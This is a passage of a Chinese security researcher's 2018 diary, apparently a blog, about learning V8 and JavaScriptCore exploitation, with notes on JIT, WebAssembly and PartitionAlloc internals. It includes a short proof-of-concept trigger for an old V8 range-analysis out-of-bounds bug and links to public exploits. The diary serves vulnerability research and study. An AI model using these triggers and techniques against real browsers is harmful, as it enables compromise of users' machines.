rel="noopener">https://www.zhihu.com/question/290982869/answer/474629999</a></li><li>最近在调的那个洞，通过改源码，打印遍历路径，确实看到了一些不一样的东西，差不多分析了0.1吧。。明天继续磕</li><li>v8新出了一个wasm的编译器Liftoff好像，又有新东西可以看了ORZ<br><a href="https://v8project.blogspot.com/2018/08/liftoff.html" target="_blank" rel="noopener">https://v8project.blogspot.com/2018/08/liftoff.html</a></li><li>和学长聊天，原来他刚毕业那会还在keen team实习过，那时候科恩还没并入腾讯。</li></ol><h2 id="2018-8-22-23"><a href="#2018-8-22-23" class="headerlink" title="2018-8-22-23"></a>2018-8-22-23</h2><ol><li>这周末就要跑路了，这个洞还没分析的很好，不过还是学到了不少东西。<br>JIT里面的算法相关的代码看了不少了，还读了paper，找到了一些IR的paper读。<br>trace的log基本能看懂不少了。<br>心态平和了很多，虽然我还是看不懂并且很可能一直看不懂ORZ。</li><li>不过总算写好了第一版报告。</li></ol><h2 id="2018-8-24-25"><a href="#2018-8-24-25" class="headerlink" title="2018-8-24-25"></a>2018-8-24-25</h2><ol><li>我一直不是一个很聪明的人，但是我确实是一个喜欢隔一段时间反思一下自己的人，重新审视了一下从7-8月我所学，其实本来我能做的更好，只是因为自己的懒和菜没有看更多，也该收拾心情往前走了。</li></ol><h2 id="2018-8-26-31"><a href="#2018-8-26-31" class="headerlink" title="2018-8-26-31"></a>2018-8-26-31</h2><ol><li>回了一趟学校，把外出实习申请和体测搞完了，然后sky师傅让我准备一个分享。。ORZ，我咋都不会啊，好方，在线等挺急的。</li><li>收到留用短信，还是蛮开心，加油加油。</li><li>v8 GC相关的东西准备看一下，先罗列一下资源</li></ol><ul><li>Are your v8 garbage collection logs speaking to you?Joyee Cheung -Alibaba Cloud(Alibaba Group)<br><a href="https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group" target="_blank" rel="noopener">https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group</a><br><a href="https://www.youtube.com/watch?v=DSBLAG2IvsY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=DSBLAG2IvsY</a></li><li>Jank Busters Part Two: Orinoco<br><a href="https://v8project.blogspot.com/2016/04/jank-busters-part-two-orinoco.html" target="_blank" rel="noopener">https://v8project.blogspot.com/2016/04/jank-busters-part-two-orinoco.html</a></li><li>2016 Beijing node live-Chau Yee Cheung-Are Your V8 GC Logs Speaking to You?<br><a href="https://www.youtube.com/watch?v=ZWtvUxl6Pyo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=ZWtvUxl6Pyo</a></li><li>垃圾回收的算法与实现<br><a href="http://library1.ga/_ads/2CCD392F898D2D1DFAD1271E01CF1CB0" target="_blank" rel="noopener">http://library1.ga/_ads/2CCD392F898D2D1DFAD1271E01CF1CB0</a></li><li>A tour of V8: Garbage Collection<br><a href="http://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection" target="_blank" rel="noopener">http://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection</a></li><li>Memory management in Blink<br><a href="https://chromium.googlesource.com/chromium/src/+/0e94f26e8/third_party/WebKit/Source/wtf/Allocator.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/0e94f26e8/third_party/WebKit/Source/wtf/Allocator.md</a></li><li>V8 —— 你需要知道的垃圾回收机制<br><a href="https://juejin.im/post/5b398981e51d455e2c33136b" target="_blank" rel="noopener">https://juejin.im/post/5b398981e51d455e2c33136b</a></li><li>解读 V8 GC Log（二）: 堆内外内存的划分与 GC 算法<br><a href="https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd" target="_blank" rel="noopener">https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd</a></li></ul><h2 id="2018-9-1-3"><a href="#2018-9-1-3" class="headerlink" title="2018-9-1-3"></a>2018-9-1-3</h2><ol><li>有点无聊，不想写日记了。</li><li>这两天在看其他phase，审相关的一个新洞，一个不错的攻击面，说不定有洞可以挖。</li><li>和我关系不错的一个同事今天离职了，有点小难过。</li><li>这两天在看了一点编译优化的算法。</li><li>想去蹭北大的课旁听，不知道值得不。<br><a href="https://xiongyingfei.github.io/SA/2017/main.htm" target="_blank" rel="noopener">https://xiongyingfei.github.io/SA/2017/main.htm</a></li><li>R大的回答依然很赞。。<br><a href="https://www.zhihu.com/question/28679215/answer/43883727" target="_blank" rel="noopener">https://www.zhihu.com/question/28679215/answer/43883727</a></li></ol><h2 id="2018-9-4-5"><a href="#2018-9-4-5" class="headerlink" title="2018-9-4-5"></a>2018-9-4-5</h2><ol><li>整理了一下v8的pipeline，重新调试分析了从bytecode-&gt;graph这么一个过程，然后把一个类型混淆导致的OOB写了一下分析。</li><li>看chakra的笔记，明月师傅太棒了。ORZ</li></ol><h2 id="2018-9-6-14"><a href="#2018-9-6-14" class="headerlink" title="2018-9-6-14"></a>2018-9-6-14</h2><ol><li>日记写的越来越少了，感觉慢慢习惯社畜生活√</li><li>做分享用的PPT，把v8 IR/GC等等写了一下，说来今天是v8 10周年来着……</li><li>收到录用电话，以后就是xlabのsakura。</li><li>写了两篇分析给导师，天天审代码ORZ。</li><li>对，我现在就是饿了在等夜宵（6:15)</li><li>这周真是摸鱼……不行不行……要振作！</li><li>以后要习惯早睡了，半夜突然心跳过速，4点多……去医院待到六点多降下来了，还好医生说除了心率快，其他的波形都正常……就是熬夜+焦虑吧。。<br>马上买了个小米手环……强制自己12点睡着，命重要命重要ORZ</li><li>录用函发下来了，等十月中旬谈薪资待遇，乖巧.jpg</li></ol><h2 id="2018-9-15-16"><a href="#2018-9-15-16" class="headerlink" title="2018-9-15-16"></a>2018-9-15-16</h2><ol start="2"><li>上周怠惰了一周，下周准备开始从能利用的漏洞开始看了，JIT算法什么的先放一边，然后给自己点高效的正反馈。</li></ol><h2 id="2018-9-17-21"><a href="#2018-9-17-21" class="headerlink" title="2018-9-17-21"></a>2018-9-17-21</h2><ol><li>这周看了几个能利用的漏洞，整理了一下exp写法，龚广那个oob read-&gt;任意地址读写的写法真的好6……，主要在对外发exp的就那么几个人，lokihardt，大宝，龚广，KK。</li><li>今天lw师傅分享了v8 UAF，绝赞，加上v8的wasm整理一下下一阶段的工作，继续学习。</li></ol><h2 id="2018-9-22"><a href="#2018-9-22" class="headerlink" title="2018-9-22"></a>2018-9-22</h2><ol><li>今天整理了一下接下来看什么，先把v8 oob和type confused的几种利用方法和primitive写了一下，ArrayBuffer的backing store这块涉及PartitionAlloc就不是很懂，学习看看。</li></ol><h2 id="2018-9-23-28"><a href="#2018-9-23-28" class="headerlink" title="2018-9-23-28"></a>2018-9-23-28</h2><ol start="2"><li>这周主要还是顺着JIT的洞看了一下，主要就是loki交的几个洞。<br>762874是lastIndexOf中Range Analysis出错，本来范围应该是(-1,maxlength)，但是它代码是写的是(-1,maxlength-1)，然后范围分析错了之后，通过简单构造，可以在优化的时候觉得索引始终在数组边界内，于是就在simplifed lowering里reduce掉了checkbounds。<br>但是在新版本v8里，它不会对checkbounds进行消除，加了一个flag，只能在终端启动的时候选择禁用，无法绕过。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  var i &#x3D; &#39;A&#39;.repeat(2**28 - 16).indexOf(&quot;&quot;, 2**28);</span><br><span class="line">  i +&#x3D; 16; &#x2F;&#x2F; real value: i &#x3D; 2**28, optimizer: i &#x3D; 2**28-1</span><br><span class="line">  i &gt;&gt;&#x3D; 28; &#x2F;&#x2F; real value i &#x3D; 1, optimizer: i &#x3D; 0</span><br><span class="line">  i *&#x3D; 100000; &#x2F;&#x2F; real value i &#x3D; 100000, optimizer: i &#x3D; 0</span><br><span class="line">  if (i &gt; 3) &#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    var arr &#x3D; [0.1, 0.2, 0.3, 0.4];</span><br><span class="line">    return arr[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>然后就把typer这块代码顺着大致看了看。</li></ol><p>还调了一个之前异常里触发的callback，bugs:798644<br>然后在for-loop里改掉了array的类型，从DICTIONARY_ELEMENTS-&gt;HOLEY_ELEMENTS。<br>loki用了一个unshift来把dictionary重新compact，patch里是在for-loop里加了一个类型检查，然后在新版v8里unshift不再能重新compact了，这个特性也没了。<br>本质上其实还是一个prerequisite不满足引起的fastpath bug，但是loki能想到这么触发真的很厉害。</p><p>还有一个在InferReceiverMaps因为new.target被直接当成JSFunction处理，但是其实这里可以接收任何带有constructor的JSReceiver，于是就类型混淆了，之前看过，但是没写笔记，也没好好看这个洞能不能利用，就翻出来想调一下重新看一下。</p><p>最后是之前v8 6.9提到的dataview的新特性</p><p>Dataview在6.9版本做了比较大的更新</p><ul><li>runtime从c++迁移到CSA,用torque(一种用于生成CSA的DSL)重写</li><li>JSCall中进行builtin inline</li></ul><p>然后我主要是在审JSCall里对DataView的runtime inline的地方，刚开始看。<br>其他的就想了一些调试看代码的方法，后面我会总结一下写个文档。</p><h2 id="2018-9-29-10-8"><a href="#2018-9-29-10-8" class="headerlink" title="2018-9-29-10-8"></a>2018-9-29-10-8</h2><ol><li>最近主要就是在学漏洞利用，感觉不错，你看，整天搞分析的时候觉得想写利用，现在天天写利用又觉得还是想再做点分析，矛盾++</li><li>博客好久没更新了，文章全都更新在本地了。。不过有v8的问题欢迎一起讨论学习啦（给大佬递茶）。。QQ/Wechat在关于页面有……</li><li>慢慢习惯了现在的工作呢，每天想做就有一堆事情可以做，不想做可以什么都不做……</li></ol><h2 id="2018-10-9-10-27"><a href="#2018-10-9-10-27" class="headerlink" title="2018-10-9-10-27"></a>2018-10-9-10-27</h2><ol><li>整理一下最近学了什么，分析清楚了几个v8的JIT漏洞，暂时把v8的exp学习告一段落了，剩下的都不好写。</li><li>搞了一个无脑杂交的js fuzz，效果还行，出乎我的意料</li><li>漏洞会挖到的。</li></ol><h2 id="2018-10-28-10-29"><a href="#2018-10-28-10-29" class="headerlink" title="2018-10-28-10-29"></a>2018-10-28-10-29</h2><ol><li>整理了一下朋友给我的win kernel exploit资料，准备后面学习一下。<br>win kernel环境搭建<br><a href="https://bbs.pediy.com/thread-247019.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247019.htm</a><br>基础知识<br><a href="https://rootkits.xyz/blog/" target="_blank" rel="noopener">https://rootkits.xyz/blog/</a><br><a href="https://xiaodaozhi.com/" target="_blank" rel="noopener">https://xiaodaozhi.com/</a><br>顺便推一下他的博客。<br><a href="https://www.redog.me/" target="_blank" rel="noopener">https://www.redog.me/</a><br><a href="https://github.com/redogwu/windows_kernel_exploit" target="_blank" rel="noopener">https://github.com/redogwu/windows_kernel_exploit</a></li><li>顺便归档一下其他的资料<br>vm escape资料<br><a href="https://dangokyo.me/2018/03/02/go-for-vm-escape/" target="_blank" rel="noopener">https://dangokyo.me/2018/03/02/go-for-vm-escape/</a><br>IE漏洞资料<br><a href="https://github.com/wnagzihxa1n/BrowserSecurity/blob/master/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99.md" target="_blank" rel="noopener">https://github.com/wnagzihxa1n/BrowserSecurity/blob/master/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99.md</a></li><li>看了一下seccon2018的wp，艺术字那个题没找到wp，但是trick很多做不来，看了一道入门rop和kidvm；看了一下google ctf2018 Final，两道chrome的题目都不太会做，卒。</li><li>今天上午开了实验室大会，很有意思。</li><li>需要看一下wasm的东西了，blink to do，又是坑<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=826434" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=826434</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=836141" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=836141</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1642" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1642</a></li><li>需要记录一下google ctf2018的一个有趣的challenge。<br>这个赛题应该是涉及两个知识点，一个是v8的range analysis和remove checkBounds<br>一个是浏览器里的浮点数是有精度极限的，合理构造能得到有趣的东西。<br><a href="https://gctf-2018.appspot.com/#challenges/pwn-just-in-time" target="_blank" rel="noopener">https://gctf-2018.appspot.com/#challenges/pwn-just-in-time</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER</a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  x = <span class="number">0.1</span>;</span><br><span class="line">  x = x + <span class="number">2</span> + <span class="built_in">Number</span>.MAX_SAFE_INTEGER ;</span><br><span class="line">  <span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt();</span><br><span class="line">b=opt();</span><br><span class="line">%OptimizeFunctionOnNextCall(opt);</span><br><span class="line">a = opt();</span><br><span class="line">print(b);</span><br><span class="line">print(a);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">9007199254740994</span></span><br><span class="line"><span class="number">9007199254740992</span></span><br></pre></td></tr></table></figure><h2 id="2018-10-30-11-8"><a href="#2018-10-30-11-8" class="headerlink" title="2018-10-30-11-8"></a>2018-10-30-11-8</h2></li><li>最近还是在主要花时间写利用和分析JIT上，理解checkbounds remove和checkmaps remove对我帮助很大。似乎能够建立起一套新的利用方式。</li><li>用gdb直接调试手机chrome真的是个大坑。</li></ol><h2 id="2018-11-9-11-10"><a href="#2018-11-9-11-10" class="headerlink" title="2018-11-9-11-10"></a>2018-11-9-11-10</h2><ol><li>看google ctf2018那道题，想完整的调一下chrome上的rce，小书包掏出IDA，现在的最大的问题是我需要逆向出math.cos这样的数学函数来帮我下断点，不然我写不了利用。<br>这可太难了。有没有大佬教教我~</li><li>（11-17日补充）：搞出来了，也没有很难，摊手。</li></ol><h2 id="2018-11-17"><a href="#2018-11-17" class="headerlink" title="2018-11-17"></a>2018-11-17</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-17-114730.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-17-115025.jpg" alt=""><br>今天是想说一下天府杯啦，xuanwu lab第二，lw师傅打了三个手机浏览器项目，很厉害，明年我也要打。<br>其实打手机浏览器我已经准备了很多了，很多chrome v8能利用的漏洞，我都在linux上写了exp，剩下的事情并不复杂了，只要能调试和简单的逆向，然后适配手机就OK了。<br>所以其实呢平时多积累1day的exploit是很有意义的一件事情，到用到的时候就简单适配就好了。<br>让我感慨比较多的还是大宝，大宝太强了，他一个人可以搞定所有的浏览器，而且花了并不长的时间学习和搞定了ios的越狱。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-17-120007.png" alt=""><br><a href="https://www.anquanke.com/post/id/149939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/149939</a><br>顺手mark一下他当时的议题，虽然找不到PPT，mosec就是这点不好，完全不公开，只能找到这点资料了。</p><p>我现在在xuanwu lab做的并不是很好，挖v8的洞也挖不到，写利用也用不到我，感觉自己的工作就是完全在自学，比较边缘化，但是大家都是这么过来的，总有需要我忙起来的时候，在那之前我只需要不断的积累积累和积累。</p><p>其实在这里我想提一件好玩的事情，那就是，<strong>如果你不尝试，你永远不知道自己能做到哪一步。</strong><br>看过我日记的话应该知道，我其实只是从今年二三月份才开始调试CVE的，而且是先搞的内核的漏洞，而浏览器漏洞可能在面试之前只搞过两个周多些（可能更短，然后在实习之前又有很多其他杂七杂八的事情干扰了我，比如期末考试），在实习之前才花了些时间补充了一些基础知识，但我知道远远不够。<br>然后我面过了xuanwu lab的浏览器组，似乎也拿到了其他的offer（似乎）<br>在实习的大概四个月里，我学会了如何去审计和分析，积累浏览器特性；<br>学习了如何写一个能跑起来的js fuzz；<br>学会了如何调试chrome，在PC上写一个完整的chrome exploit；<br>一些推特上的大佬给了我不少帮助，感觉大佬们真的是很平易近人了，还有其他朋友和我一起研究了不少东西，我觉得很开心。</p><p>我们这个行业发展是很快的，要跟上前面的人的进度，就必须跑起来，飞快的跑起来。</p><p>后面的打算是，和大宝说的差不多，一是仔细审计和分析学习历史漏洞，找找how to bypass patch的点，二是好好学习一下其他浏览器上的JIT，比如edge比如jsc，重点学习大宝和loki的洞，寻找更多的启发性的点。<br>积累下去，我会变得更好的，我确定。</p><h2 id="2018-11-19"><a href="#2018-11-19" class="headerlink" title="2018-11-19"></a>2018-11-19</h2><ol><li>今天在翻jsc的漏洞exploit，认识了一个越狱大佬，和大佬交流了一下，然后学会了怎么单独编译jsc和怎么找patch。<br>后面预备写一个jsc漏洞利用系列，todo it。</li><li><a href="https://www.w3.org/TR/wasm-js-api-1/" target="_blank" rel="noopener">https://www.w3.org/TR/wasm-js-api-1/</a><br>今天在翻wasm的文档，调试分析<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=766253，看partitionAllocation的头秃，d8还调不了，配了一下windbg的调试环境，搞了一下符号和断点。" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=766253，看partitionAllocation的头秃，d8还调不了，配了一下windbg的调试环境，搞了一下符号和断点。</a></li><li>感觉有锅（项目），但是估计不是我背锅，继续干活。。困死我了。</li><li>终于找到了，可以写exp了。</li></ol><h2 id="2018-11-22"><a href="#2018-11-22" class="headerlink" title="2018-11-22"></a>2018-11-22</h2><ol><li>这周前两天配调试环境+去医院。</li><li>后两天分析root cause+去医院，倒是找到了root cause和它可能产生的影响，但是到了在partitionAlloc堆上调试exp，又懵了……<br>感觉在做一道非常难的pwn题。。</li></ol><h2 id="2018-11-23"><a href="#2018-11-23" class="headerlink" title="2018-11-23"></a>2018-11-23</h2><ol><li><p>先说结论<a href="https://cs.chromium.org/chromium/src/base/allocator/partition_allocator/partition_freelist_entry.h?g=0&amp;l=23" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/base/allocator/partition_allocator/partition_freelist_entry.h?g=0&amp;l=23</a><br>猜我已经全猜出来了，后面整理文档。漏洞很有意思。</p></li><li><p>这个漏洞的root cause就是在一个wasm实例化<code>InstanceBuilder::InstanceBuilder</code>的时候<br>因为触发了一次回调。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int InstanceBuilder::ProcessImports(Handle&lt;FixedArray&gt; code_table,</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">      MaybeHandle&lt;Object&gt; result &#x3D;</span><br><span class="line">        module_-&gt;is_asm_js() ? LookupImportAsm(index, import_name)</span><br><span class="line">                             : LookupImport(index, module_name, import_name);</span><br></pre></td></tr></table></figure><p>于是又进行了一次wasm2的实例化，因为wasm的实例化里有这么一个判断。<br>它会先把已有的compiled_module对象拿来用，首先检查它有没有owner，如果有了就克隆一份。<br>因为我们是在还没有设置owner之前就触发了回调再次实例化，于是两个wasm对象的compiled_module是一样的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Handle&lt;WasmCompiledModule&gt; original;</span><br><span class="line">    &#123;</span><br><span class="line">      DisallowHeapAllocation no_gc;</span><br><span class="line">      original = handle(module_object_-&gt;compiled_module());</span><br><span class="line">      <span class="keyword">if</span> (original-&gt;has_weak_owning_instance()) &#123;</span><br><span class="line">        owner = handle(WasmInstanceObject::cast(</span><br><span class="line">            original-&gt;weak_owning_instance()-&gt;value()));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (original-&gt;has_weak_owning_instance()) &#123;</span><br><span class="line">      <span class="comment">// Clone, but don't insert yet the clone in the instances chain.</span></span><br><span class="line">      <span class="comment">// We do that last. Since we are holding on to the owner instance,</span></span><br><span class="line">      <span class="comment">// the owner + original state used for cloning and patching</span></span><br><span class="line">      <span class="comment">// won't be mutated by possible finalizer runs.</span></span><br><span class="line">      DCHECK(!owner.is_null());</span><br><span class="line">      ...</span><br><span class="line">      TRACE(<span class="string">"Cloning from %d\n"</span>, original-&gt;instance_id());</span><br></pre></td></tr></table></figure><p>在后面grow掉wasm2的buffer的时候，会将两个instance的wasm_memory_reference都改掉。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RelocInfo::update_wasm_memory_reference</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Isolate* isolate, Address old_base, Address new_base,</span></span></span><br><span class="line"><span class="function"><span class="params">    ICacheFlushMode icache_flush_mode)</span> </span>&#123;</span><br><span class="line"><span class="comment">//  DCHECK(IsWasmMemoryReference(rmode_));</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"new_base is :%p\n"</span>,new_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"old_base is :%p\n"</span>,old_base);</span><br><span class="line">  Address updated_reference = new_base + (wasm_memory_reference() - old_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"updated_reference is:%p\n"</span>,updated_reference);</span><br><span class="line">  <span class="comment">// The reference is not checked here but at runtime. Validity of references</span></span><br><span class="line">  <span class="comment">// may change over time.</span></span><br><span class="line">  set_embedded_address(isolate, updated_reference, icache_flush_mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体的还要再看看，剩下主要还是在看partitionAlloc，<br>利用基本上是搞明白了，一些细节的东西还是要整理一下。</p></li><li><p>组会被问chrome sandbox escape，啥都不会的我。。太菜了ORZ</p></li><li><p>这周基本上就是在调试wasm的漏洞，和实现一个arraybuffer oob r/w的exp吧，后者geohot在2014年就搞过了23333.</p></li></ol><h2 id="2018-11-27"><a href="#2018-11-27" class="headerlink" title="2018-11-27"></a>2018-11-27</h2><ol><li>这一周基本上都在医院辗转度过……考虑是植物神经紊乱吧。<br>摸鱼休息，调整饮食和作息，锻炼身体，不知不觉已经老了ORZ。<br>说到底。。经常凌晨三四点睡觉还不吃早饭。。能苟活到现在我也太幸运了。。</li><li>可惜了realworld ctf，估计是不能去了，这段时间还是养病重要。。要吃清淡了。。趴桌</li><li>把partitionAlloc大概看了看，基本没问题了，利用也基本写完了，不过在任意地址读写的原语之后，如何得到一个完整的exp，还要商榷一下，windbg很厉害。。’dx -r1 isolate’<br>cheat engine也很厉害……<br>不过说来调的时候发现了很多有意思的东西，可以顺手再逆一下chrome了。<br>另外在看之前的东西的时候，发现typedArray的elements里原来就有存arraybuffer的backingstore，越界直接写这里就行了。。</li><li>准备看下天府杯的那个洞了，基本上定位到了patch，这两天调一下看看。</li><li>试图编译chrome apk，然后用来恢复符号，看看能不能在国产手机浏览器上找到点有用的调试符号。这个真的是很头疼呀，也不太好意思问同事，趴桌。</li></ol><h2 id="2018-11-30"><a href="#2018-11-30" class="headerlink" title="2018-11-30"></a>2018-11-30</h2><ol><li>一周结束了，整理一下这周，最近十点睡八点起，过得很有规律，也挺好的，身体也在康复中，很遗憾realworld ctf不能去了，多休息吧。</li><li>在最新版chrome上面写了exp，简单的栈劫持+mprotect弹计算器，挺开心的。</li><li>说来大概从开始写利用也搞了两个月了，稍微有点进度感人，但是总算还是搞的差不多了，对GC管理还要再熟悉，不过很开心了。</li><li>接下来主要看看chrome sandbox escape fuzz，然后loki最近在挖jsc的漏洞，这个也值得好好学习一下。</li><li>最近似乎经常有人问我二进制怎么入门……之前看过一个杨博士以前说的，手写一个cpu，手写一个内核，手写一个编译器，然后我觉得最好再手写一个STL库。然后就入门了（逃</li></ol><h2 id="2018-12-3"><a href="#2018-12-3" class="headerlink" title="2018-12-3"></a>2018-12-3</h2><ol><li>扁桃体发炎的我完美错过realworld ctf，熬夜熬的ORZ<br>看了看rw的赛题，safari jsc那道题基本上就是抄的saelo p2o2018的漏洞造的洞，clobeerWorld代表删除之前做出的任何关于类型信息的假设,然后长亭造的这个洞把它删掉了，即假定在for-in循环中检索对象的property是没有副作用的，感觉比v8里好懂多了…<br>exp如果不是因为最近的那个缓解机制的话，应该复制粘贴就能写了。。23333</li><li>病了两周的我今天在补笔记，很多细节忘干净了。ORZ</li></ol><h2 id="2018-12-4"><a href="#2018-12-4" class="headerlink" title="2018-12-4"></a>2018-12-4</h2><ol><li>今天因为学校要交材料回去补第七学期外出实习的证明，置换学分。所以感慨一下，自己的人生好像在走钢丝，一不小心就GG了<br>熟悉我的人可能知道，我学校很一般23333<br>我的小伙伴也觉得：没有强大的背景和资源倒不一定意味着没有前途，只是容错率低得多罢了，在别人探索人生享受诗和远方的时候就不得不找准一条路走到黑，一个环节出了问题，就GG了<br>为什么同样是这个行业，有的人就不会焦虑，因为差距呀。</li><li>然后一件开心的事情是，我导师今天终于和我聊了一下，我还以为我被忘了23333，继续努力就是了。<br>没什么可以选择的，就算掉下去了，我能做的，也只有让自己不要摔的太惨而已。</li><li>补了cve-2017-15401的笔记，完全是windbg和cheatengine写出来的exp可还行（滑稽</li></ol><h2 id="2018-12-5"><a href="#2018-12-5" class="headerlink" title="2018-12-5"></a>2018-12-5</h2><ol><li>龚神的洞看不懂。</li><li>最近在一种思路出了好几个洞，也是厉害，在我觉得没东西看的时候，突然爆炸。。</li></ol><h2 id="2018-12-9"><a href="#2018-12-9" class="headerlink" title="2018-12-9"></a>2018-12-9</h2><ol><li>最近仔细看了看，龚神的洞是worker的序列化和反序列化的问题，这个点从来也没去看过，感觉大家估计也不懂这个东西该怎么用，还是很神奇的一件事情。</li><li>最近对逻辑漏洞十分感兴趣，得益于同事花了两天挖到了一个windows的提权0day</li><li>sqlite的漏洞，可以拿来打Chrome，之前看过一点相关的东西<br><a href="https://worthdoingbadly.com/sqlitebug/" target="_blank" rel="noopener">https://worthdoingbadly.com/sqlitebug/</a></li></ol><h2 id="2018-12-10-17"><a href="#2018-12-10-17" class="headerlink" title="2018-12-10-17"></a>2018-12-10-17</h2><ol><li>最近就一直在解决1710的exp的问题，解决不了，陷入自闭。。<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1710" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1710</a></li><li>今天休息一下看看safari 0.5day。<br><a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">http://phrack.org/papers/attacking_javascript_engines.html</a><br><a href="https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html" target="_blank" rel="noopener">https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html</a></li></ol><h2 id="2018-12-17-26"><a href="#2018-12-17-26" class="headerlink" title="2018-12-17-26"></a>2018-12-17-26</h2><ol><li>最近一直在摸鱼，群星真好玩.jpg，然后在找方向，一直以来靠分析漏洞和写利用来续了一波命，但是还是没搞懂该怎么挖洞，也没人能告诉我chrome v8的洞怎么挖，论编程的能力，这两年在学校靠自己真的没锻炼出啥来，突然开始意识到自己基础薄弱什么都不会了。<br>别人在学校的时候，就通过上课+实验的方式打了很好的基础，而我……感觉一路走来都是自己一个人xjb搞，偶尔和师傅们交流一下，方向上感觉没什么大的问题，就是真的，嗯，我太弱了。希望大家不要犯这种错误了，但是要是再来一次的话，我还是会选择先进实验室再说。</li><li>操作系统基础学习资料，顺便安利CSAPP<br><a href="https://nju-ics.gitbooks.io/ics2016-programming-assignment/content/" target="_blank" rel="noopener">https://nju-ics.gitbooks.io/ics2016-programming-assignment/content/</a><br><a href="https://github.com/Changochen/nju-pa" target="_blank" rel="noopener">https://github.com/Changochen/nju-pa</a></li><li>逻辑漏洞学习，顺便安利James Forshaw，一直想学也一直没学，就先todo list了<br><a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf" target="_blank" 